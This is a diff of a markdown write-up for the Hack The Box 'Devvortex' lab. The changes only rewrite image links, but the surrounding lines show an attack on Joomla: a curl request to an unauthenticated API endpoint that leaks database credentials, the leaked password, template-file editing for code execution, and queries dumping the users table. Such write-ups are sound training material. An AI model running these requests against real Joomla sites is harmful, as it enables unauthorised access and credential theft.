@@ -72,8 +72,8 @@ Creds do not work.
 
 Default path for joomla instances > Check version
 http://dev.devvortex.htb/administrator/manifests/files/joomla.xml 
-![[Pasted image 20251106224547.png]]
-![[Pasted image 20251106224448.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251106224547.png)
+![Image](/assets/img/htb-writeups/Pasted image 20251106224448.png)
 
 Vulnerable to:
 https://www.exploit-db.com/exploits/51334
@@ -84,14 +84,14 @@ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true -v
 
 user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}
 ```
-![[Pasted image 20251106233255.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251106233255.png)
 
 Burp:
 GET /api/index.php/v1/config/application?public=true
-![[Pasted image 20251106234500.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251106234500.png)
 
 System > Site Template > Cassiopea Files
-![[Pasted image 20251106234156.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251106234156.png)
 
 One-Liner Script to fetch via curl request:
 ```
@@ -116,7 +116,7 @@ use joomla;
 show tables
 select * from sd4fg_users;
 ```
-![[Pasted image 20251107001915.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251107001915.png)
 
 Logan
 ```
